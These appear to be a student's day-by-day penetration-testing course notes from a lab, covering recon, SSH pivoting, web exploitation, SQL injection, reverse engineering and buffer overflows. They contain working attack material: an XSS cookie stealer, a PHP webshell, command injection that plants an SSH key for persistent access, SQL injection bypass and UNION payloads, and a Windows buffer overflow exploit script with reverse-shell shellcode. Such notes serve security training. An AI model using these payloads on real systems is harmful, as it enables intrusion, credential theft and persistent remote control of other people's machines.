## PEN TESTING
                                                
day 1 pen testing 
The 6 phases of pen testing 
           1. Mission definition (goals, targets, scope, valid net targets, valid host targets, what exploits are valid, RoE)
           2. Recon (OSINT info gathering)
           3. Footprinting(gather data through scanning and interacting, fingerprinting)
           4. exploit/initial access(gain initaial foothold on target)
           5. post-exploitation(Persistance, exfiltration and obfuscation)
           6. document mission(Document mission)[AC:techinical, executive summary]

          
HTML(HYPER TEXT MARKUP LANGUAGE) 
inspect, ctr+f, view page source, links

webrowser enumaration:
```
wget -r 
curl
robots.txt
view page source(right click)
inspect (right click) similar to "view page" but it has drop downs and easier to tempurarly edit page
```

scanning tech: (nmap--scripts, http enum) [AC: stored in '/usr/share/nmap/scripts' by default]
 1.host discovery
 2. port enum
 3. port interrogation
 [example of nmap script syntax] nmap --script-trace

#ping sweep command
```
for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
```

## day 1 python scraper        

python: a programing language commonly used for scraping (object orianted).method(function)  
   libraries- ia a collection of comman functions

 example of a scraper looking for Authers"  
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
   "output of the script above"  
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']
Advanced Scanning Techniques



-----------------------------------------------------------------------------------------------------------------DAY 1.5





                                                                       RECON AND SCANNING










## day 2 walkthrough//MS practice
```
# Authenticate to next box -S creates socket file -M enables multiplexing
ssh -MS /tmp/jmp demo@10.50.13.244 2>/dev/null
-------------------------------------------------------------------------------------------------------day 1.5 for i in i ping sweep 
#from next box, ping sweep
for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done

##we found:
10.208.50.1:
10.208.50.42:22,80            f
10.208.50.61:
10.208.50.200:
10.208.50.230:

##dynamic portforward from linops to allow proxychains
ssh -S /tmp/jmp jmp -O forward -D 9050

##verify portforward was set
ss -antlp | grep 9050

##verify socket file
ls /tmp

##portscanning with nmap after proxychains portforward is set
proxychains nmap 10.208.50.1      (,42,61,200,230)

------------------------------------------------------------------------------------------------day 1.5 nmap http script 
##once youve foud your port, run he appropriate script
proxychains nmap --script=http-enum 10.208.50.42 80

 ###command output###

Nmap scan report for 10.208.50.42
Host is up (0.00080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum:
|   /robots.txt
|   /java/
|   /path/
|_  /uploads/

##end of output##
 
##connect to ports and hosts through the same master socket
#the established inital master socket IS ALREADY a tunnel, just -L and head to the next box

ssh -S /tmp/jmp jmp -O forwrd -L 21101:10.208.50.42:80

##to cancel connections to hosts
ssh -S /tmp/jmp jmp -O cancel -L 21101:10.208.50.42:80

##how to pivot again
ssh -MS /tmp/jmp2 user@127.0.0.1 -p 21100

##close current dynamic port
ssh -S /tmp/jmp -O cancel -D 9050

##open proxychains on new pivot
ssh -S /tmp/jmp2 -O forward -D 9050



VIEW PAGE SOURCE
INSPECT ELEMENT

```

## WEB EXPLOITATIOIN 
```
--------------------------------------------------------------------------------------------------day 2 Web exploitiation

----------------------------------------------------------------------------------------------------day 2 cookie stealer


##cookie stealer syntax, be mindful of where our listener is
                                       internal of our jump box
  <script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
     nc -l 127.0.0.1 <port number you are listening on>    


----------------------------------------------------------------------------------------day 2 malicious upload
###MALICIOUS UPLOAD,   need to be able to upload file, and locate file
<HTML><BODY>
<FORM METHOD="GET"  NAME="myform" ACTION="">
<INPUT TYPE="text" NAME= "cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
system($_GET['cmd'])'
}
?> 
</pre>
</BODY></HTML>
##end of script

  4.) Uploaded `webshell.py` onto website. 
    - *Note: Tested upload to see normal function before uploading script*
    
  5.) Performed *Directory Traversal* by going to "127.0.0.l:21120/net_test"
  
  ; ls /var/www/html/uploads
  ; python3 /var/www/html/uploads/webshell.py
      - This opened up a shell as "billybob"
  
  6.) Generated ssh-key on my machine
    - lin-ops: `ssh-keygen -t rsa -b 4096`
      - Saved in: `/home/student/.ssh/id_rsa.pub`

  7.) Made directory and stored ssh-key on server using Command Injection

; mkdir /home/billybob/.ssh
; ls -latr /home/billybob/   \\Verified ".ssh" was made
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDM4diWHtMrPRPK8bb4VsV+d6ZYQ7SQ+Y+tdQZtk68O+cgvHzqpXvypfNkE5zYoK8isjX65XiDwM/TBUyc1J+zEvbD7hYTMvFlyjJynHmAreTCAN9zKScLvkGuqNZmEM3kRFtfC3r1hNeX4kVYxM5wg4+FBruigOXCasRTNjYAKpJD3JQ5aH5WTlmmsoAVuZMBqptQSB51SMxjV2vEPQJv4a8M09HHykrY7BC+QOVRSROuBXtCXs7md9q30L/0un1vNnoyiVqQkT7YwNc6F93oki5qUDPkVvkQJ+lGdC84ry2X59JEQ6wXsSeF4+qxLabR09WgFzSSVBgHofnYBwGnCLO//Ml/UmOp2qKDXoHDY/zbzBGVnsHKRep/XcQlyJMh7REeGzQLIF4ww1dvlNXb6S0ylsLqavbQYfcu0oEaA8h+IFNCGSvJMENRahZxt1wzEtuW9lJXnOzQgfAAfdVyNvzyqHAoKxJVIAs+qGNncinO+v2OJbb2PdDKk4z8u9s6b3jNi/cahYdvpOp+HXrp6ottDIqXsvfkUC7VtryubpS/w+2KdlbDcF4t+mU53sex4i6alE0BqCcBDPvcN4mt+CT/bO4NGWO8XkKDc2nnwOjCQMvYFsbFkiVWj8uxIRUmoicYBpApP3bBnMK/jQjwiMbFwYeXS5sBsUPVfX3Kziw== student@lin-ops" > /home/billybob/.ssh/authorized_keys
; ls -latr /home/billybob/.ssh    \\Verified "authorized_keys" was made

  8.) Create SSH Tunnel on my machine to it
    - ssh -S /tmp/jmp jmp -O forward -L 21121:10.100.28.40:4444
    
  9.) Attempt to login through tunnel and ssh-key
    - ssh -v -p21121 billybob@127.0.0.1    \\"v" makes it verbose to see what happens
    *Note: If prompted for password, something went wrong!*
    
  10.) Banner: You are accessing a system operated by the lLYIOZAUi72usDBt0a7e, all actions are being monitored.
</details>

-------------------------------------------------------------------------------------------------------DAY 2 SSH KEY GENERATION
##shh-keygen
      (On linops)-  ssh-keygen -t rsa -b 4096
      no passphrase
  (from remote host with cmdinjection vulnurabilty)- ;mkdir /var/www/.ssh [makes the directory to write too in the home of the user you are exploiting]
                                                      ;ls - la /var/www 
                                       (on linops)    ;cat /home/studetn/.ssh/id_rsa.pub   
                             (back on remote host)    ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDM4diWHtMrPRPK8bb4VsV+d6ZYQ7SQ+Y+tdQZtk68O+cgvHzqpXvypfNkE5zYoK8isjX65XiDwM/TBUyc1J+zEvbD7hYTMvFlyjJynHmAreTCAN9zKScLvkGuqNZmEM3kRFtfC3r1hNeX4kVYxM5wg4+FBruigOXCasRTNjYAKpJD3JQ5aH5WTlmmsoAVuZMBqptQSB51SMxjV2vEPQJv4a8M09HHykrY7BC+QOVRSROuBXtCXs7md9q30L/0un1vNnoyiVqQkT7YwNc6F93oki5qUDPkVvkQJ+lGdC84ry2X59JEQ6wXsSeF4+qxLabR09WgFzSSVBgHofnYBwGnCLO//Ml/UmOp2qKDXoHDY/zbzBGVnsHKRep/XcQlyJMh7REeGzQLIF4ww1dvlNXb6S0ylsLqavbQYfcu0oEaA8h+IFNCGSvJMENRahZxt1wzEtuW9lJXnOzQgfAAfdVyNvzyqHAoKxJVIAs+qGNncinO+v2OJbb2PdDKk4z8u9s6b3jNi/cahYdvpOp+HXrp6ottDIqXsvfkUC7VtryubpS/w+2KdlbDcF4t+mU53sex4i6alE0BqCcBDPvcN4mt+CT/bO4NGWO8XkKDc2nnwOjCQMvYFsbFkiVWj8uxIRUmoicYBpApP3bBnMK/jQjwiMbFwYeXS5sBsUPVfX3Kziw== student@lin-ops" >> /var/www/.ssh/authorized_keys
                                                      ;cat /var/www/.ssh/authorized_keys
                                       (on linops)    ;ssh -i .ssh/id_rsa -p <port connected to remote> www-data@<ip>

 
---------------------------------------------------------------------------------------------------day 2 command injection
HTTP methods: GET, POST, HEAD, PUT
  HTTP response codes: 10X(INFO), 2XX(SUCCESS), 30X(REDIRECTION), 4
    



    java script; you can find  functions by searching for (), you can run a function by calling it via console on inspect <functionname()>

     
 ***  CROSS SITE SCRIPTING          
        reflected XSS:  
           most common
              acurs in error messages 
           stored XSS: 
                resides on vulnrable site 
                   only requirs user to visit page
    
    (Test if site is vulnuable to cross site scripting) 
          <script>alert('XSS');</script>


    ***serverside injextion 
              ability to read /execute outside web server directory
                  allows you to use to use reletive path to manipulae server-side file path

     ***command injection
              user input is not validated, you can use a ";" to run a command in the input section of a website

```








-------------------------------------------------------------------------------------------DAY 3 SQL



       STANDARD SQL COMMANDS
Select-extracts data from database
Union- combines the result of two or more statements
Use- selects DB to use
update- Updates data in DB

------------------------------------------------------------------------------------------------------------------authentication bypass  SQL injection
Authentication by pass             ' 1 or 1='1 

                *Logical Operators*
    (operator)                     (Example)
=, !=, <, <=, >, >=  :::::    col_name != 4
BETWEEN (#) AND (#)  :::::    col_name BETWEEN 1.5 AND 10.5
NOT BETWEEN (#) AND (#):::    col_name NOT BETWEEN 1 AND 10
IN (…)	            ::::::    col_name IN (2, 4, 6)
NOT IN (…)	 	      ::::::    col_name NOT IN (1, 3, 5)
LIKE	               :::::: 	col_name LIKE "ABC"
%	                   ::::::   (only with LIKE or NOT LIKE)	col_name LIKE "%AT%" (matches "AT", "ATTIC", "CAT" or even "BATS")
_                    ::::::   (only with LIKE or NOT LIKE)	col_name LIKE "AN_"(matches "AND", but not "AN")
ORDER BY             ::::::    (Column ASC/DESC) 
DISTINCT (COLUMN)     :::::     REMOVE DUPES
LIMIT                 :::::     REDUCE OUTPUT
OFFSET               ::::::     SPECIFY WHERE TO START

##AUTHENTICATION BYPASS ON SQL###  
1. 'OR 1='1 (IN USERNAME AND PASSWD FIELD
2. inspect > network > post > request > raw (radio button)
3. put raw output at the end of our URL (add a question mark first)  x.x.x.x/login.php?<paste here>

#### 4 step SQL injection (POST )####
1.Identify Vulnurable Fields  
         { Audi'OR 1='1 }
2.Identify number of columns   
         { Audi UNION SELECT 1,2,3,4,5 # }
3. Inject Golden Statement
                               column-name   column-name  column-name             table we are pulling from
          { Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns # }
4.Craft  queries
                 this command can help narrow down which tables to follow, this command is built off of the golden statement and its findings
          {Audi' UNION SELECT table_schema,2,3,4,5 FROM information_schema.columns #

     Audi' UNION SELECT name,2,pass,4,5 FROM session.user #

5. extra)) to get version 
Audi' UNION SELECT @@version,2,pass,4,5 FROM session.user #

##### 4 step SQL injection (GET) URL METHOD ####
1.Identify vulnurable Fields by adding ?selection=<option> OR 1=1
   <URL>/Uniondemo.php?selection=2 OR 1=1

2.Identify number of columns
 <URL>/Uniondemo.php?selection=2 UNION SELECT 1,2,3
            #YOU CAN REORGINAIZE COLOMNS IS NECESSARY 
                    <URL>/Uniondemo.php?selection=2 UNION SELECT 1,3,2
3.Inject golden statement
       <URL>/Uniondemo.php?selection=2 UNION SELECT Table_schema,Column_name,table_name FROM Information_schema.columns     (table_name and COlumn_name are swapped due to eorginized columns above

4. Craft custom queries
                                                         column,column,column FROM Database.Table
            <URL>/Uniondemo.php?selection=2 UNION SELECT name,id,pass FROM session.user
   




-----------------------------------------------------------------------------------------------------------------DAY 4 REVERSE ENGENEERING



                                                        REVERSE ENGENEERING


-----------------------------------------------------------------------------------------------------------------DAY 4 REVERSE ENGENEERING
cd C:\Users\student\Downloads\Demo 1
 #-a for ascii, findtr /i for case insensintivity
strings.exe -a -nobanner .\demo1_new.exe | findstr /i enter

#useful for finding what OS to run it on
strings.exe -a -nobanner .\demo1_new.exe | select -first 10

#Behavioral analysis
run program as intended

##skipping Dynamic 





#disassembly
#open ghidra
new project
click  file > import file 
by default: functions, dissasembler, decompiler 

#start at the end of the program, search for "success" or any disired string
search > strings: search for desired string and than double click results to see c 
#patching  
follow the code, working backwords and identify potential instructions or values to be changed
righ click on instruction value, click patch instruction, then put a new value in
File  > export program > format PE > change location > save > run



---------------------------------------------------------------------------------------------------------------DAY 5 EXPLOIT DEVOLUPMENT 



                                                    EXPLOIT DEVELOPMENT



---------------------------------------------------------------------------------------------------------------DAY 5 EXPLOIT DEVELOPMENT



## linux exploit
```
stack grows down--used for passing srguments                                                                   :stack pointer:                                :base pointer:
free memory                                                                                              address of next available spot                   the base of the stack
heap grows up--memory that can be allocated or deallocated


+---------------------+
|       Stack         |  <-- grows downward
|   NOP sled          |  <-- NOP instructions padding
|   Shellcode         |  <-- Shellcode
| - Return addresses  |
+---------------------+
|   Free Memory       |
+---------------------+
|       Heap          |  <-- grows upward


                                                                                                                              :Peda Plugin Install:
defense to buffer overflow NX, ASLR, DEP, PIE, Stack Canaries                                                   - git clone https://github.com/longld/peda.git ~/peda 
                                                                                                                - echo "source ~/peda/peda.py" >> ~/.gdbinit






exploit DEV linux

##static analysis- view code
file <>      {for file type}          
strings <>    {for viewing of code}
ls -lisa <>    {check permissions}


##behavioral- as intended
chmod +x <>   {to insure its exeecutable}
./ <>     {to run the command}


##Dynamic analysis- not as intended
1. command substitution (used for passing parameters)
$(echo "1234") or `echo "1234"
   1.5 simulate user input into a file
         <file> <<<$(echo "1234")  

2. gdb ./<file> 
           #shell; gets us back to our box wihout closing gdb
           #exit; gets us back into gdb from the shell
           #info functions; to find functions of interest such as <getTheGoods>
           #file; checks or sets the executable
           #pdisass <interesting function>; looks for things like "getuserinput"
    2.5 once you find getuser info, run pdisass on "getuserinfo or getTheGoods" and look for red things like "fgets@plt"
3. from gdb run the script                          run <<<$(python <./script.py>)
2.5 look for EIP in the info dump generated, if the eip are not there than try increasing charecter ammount
4. pinpoint EIP using wiremask - buffer overflow pattern generator 
     set 'length' to the number of characters we set in our python script
     copy and paste this into out python script where you 100 charecters are #offset = "<new large string you got from buffer overflow generator>
     this will tell you how big your offset needs to be
     : gdb run your script
     copy the hex  next to the EIP and put it into wiremask
     next set your offset of "A' to the number indicated by wiremask 
     find the jump esp command with these cmds
    from shell > env -gdb ./func 
        unset env LINES
          unset env COMUMNS 
            than run or start 
           ctr+c to stop and look at process
              info proc map
            find /b <first address after heap>,<end of stack>,0xff,0xe4  
            find /b 0xf7de1000,0xffffe000,0xff,0xe4
            copy first 5 addresses and convert them to little endian
            0x f7 de 3b 59 > "\x59\3b\de\f7"
            set eip = "\x59\x3b\xde\xf7" in our script 
  add a nopsled to our script
            nop = "\x90\" * 15                       os                            bad bytes
        than add shell code usi
ng msfvenmon -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python in your shell

    copy the reslut from the msfvenom command starting at buf = ""
    and paste that into you script 
    add all the parameters to the print function and than run your script using ./func <<<$(python ../linbuff.py)


sudo -l 
sudo ./inventory.exe
```

------------------------------------------------------------------------------------------------------------------------------DAY 5 WINDOWS BUFFER OVERFLOW 



                                                        DAY 5 WINDOWS BUFFER OVERFLOW



## winodws buffer overflow

###STEP 1.1: INCLUDES COPYING OVER THE .EXE AND THE .DLL OVER TO THE WINDOWS MACHINE, AND PLACING IN THE SAME DIRECTORY, MAKE SURE ITS AND EXECUTABLE
###STEP 1.2: OPEN IMMUNITY
###STEP 1.3: IN IMMUNITY --> (TOP LEFT CORNER) FILE -> OPEN -> <FILENAME> 
###STEP 1.4: MOVE OVER TO LINUX MACHINE
###STEP 1.5: CORRECT SCRIPT WITH WHATS UNDER STEP 2

###
ON LINUX PYTHON SCRIPT; INPUT THE FOLLOWING
#!/usr/bin/python ###STEP 1
import socket ###STEP 1

buf = "TRUN /.:/" ###STEP 2
buf += "A" * 2003 ###STEP 2.1: SET "A" TO 5000, IF NOT BRINGING BACK ERROR UP TO HGIHGER NUMBER, ONCE EIP TURNS TO "41414141" MOVE ON TO NEXT STEP 
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A........." ###2.2 GO TO WIREMASK AND INPUT LENGTH TO 5000 AND COPY THE VALUE PRODUCED INTO A NEW BUF 
    ###2.3 reset immunity and rerun the script, copy the adress of the eip and paste that into wiremask, than copy the offset given and use that as the new buf
    ###2.4 (((((troubleshooting)))))add the "BBBB" to to a buf under the new offset buf to insure offset is correct. the BBBB should be next to the EIP on wiremask
#buf += "BBBB"
    ###2.5 once 

buf += "\xa0\x12\x50\x62"





### NOP ###
buf += "\x90" *10
### reverse shell ###
buf += b"\xda\xdc\xbf\xfa\x1f\x66\xec\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x59\x31\x7a\x19\x03\x7a\x19\x83\xea"
buf += b"\xfc\x18\xea\x9a\x04\x53\x15\x63\xd5\x0b\x9f\x86"
buf += b"\xe4\x19\xfb\xc3\x55\xad\x8f\x86\x55\x46\xdd\x32"
buf += b"\x69\xef\xa8\x1c\x44\xf0\xa6\x13\x8e\x3f\x79\x7f"
buf += b"\xf2\x5e\x05\x82\x27\x80\x34\x4d\x3a\xc1\x71\x1b"
buf += b"\x30\x2e\x2f\x17\xe8\xa0\x5b\x65\x31\x97\x5a\xba"
buf += b"\xc2\x57\x25\xbf\x15\x23\x99\xbe\x45\x40\x79\xe1"
buf += b"\xee\x1e\x62\xb1\xf1\x4d\x17\xf8\x86\x4d\x29\x04"
buf += b"\x2f\x26\x7d\x71\xb1\xee\x4f\x45\x1e\xcf\x7f\x48"
buf += b"\x5e\x08\x47\xb3\x15\x62\xbb\x4e\x2e\xb1\xc1\x94"
buf += b"\xbb\x25\x61\x5e\x1b\x81\x93\xb3\xfa\x42\x9f\x78"
buf += b"\x88\x0c\xbc\x7f\x5d\x27\xb8\xf4\x60\xe7\x48\x4e"
buf += b"\x47\x23\x10\x14\xe6\x72\xfc\xfb\x17\x64\x58\xa3"
buf += b"\xbd\xef\x4b\xb2\xc2\x10\x94\xbb\x9e\x86\x58\x76"
buf += b"\x21\x56\xf7\x01\x52\x64\x58\xba\xfc\xc4\x11\x64"
buf += b"\xfa\x5d\x35\x97\xd4\xe5\x56\x69\xd5\x15\x7e\xae"
buf += b"\x81\x45\xe8\x07\xaa\x0e\xe8\xa8\x7f\xba\xe2\x3e"
buf += b"\x8a\x08\x7d\x73\xe2\x6e\x81\x9d\xaf\xe7\x67\xcd"
buf += b"\x1f\xa7\x37\xae\xcf\x07\xe8\x46\x1a\x88\xd7\x77"
buf += b"\x25\x43\x70\x1d\xca\x3d\x28\x8a\x73\x64\xa2\x2b"
buf += b"\x7b\xb3\xce\x6c\xf7\x31\x2e\x22\xf0\x30\x3c\x53"
buf += b"\x67\xba\xbc\xa4\x02\xba\xd6\xa0\x84\xed\x4e\xab"
buf += b"\xf1\xd9\xd0\x54\xd4\x5a\x16\xaa\xa9\x6a\x6c\x9d"
buf += b"\x3f\xd2\x1a\xe2\xaf\xd2\xda\xb4\xa5\xd2\xb2\x60"
buf += b"\x9e\x81\xa7\x6e\x0b\xb6\x7b\xfb\xb4\xee\x28\xac"
buf += b"\xdc\x0c\x16\x9a\x42\xef\x7d\x98\x85\x0f\x03\xb7"
buf += b"\x2d\x67\xfb\x87\xcd\x77\x91\x07\x9e\x1f\x6e\x27"
buf += b"\x11\xef\x8f\xe2\x7a\x67\x05\x63\xc8\x16\x1a\xae"
buf += b"\x8c\x86\x1b\x5d\x15\x39\x61\x2e\xaa\xba\x96\x26"
buf += b"\xcf\xbb\x96\x46\xf1\x80\x40\x7f\x87\xc7\x50\xc4"
buf += b"\x98\x72\xf4\x6d\x33\x7c\xaa\x6e\x16"

### WIREMASK ###
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9F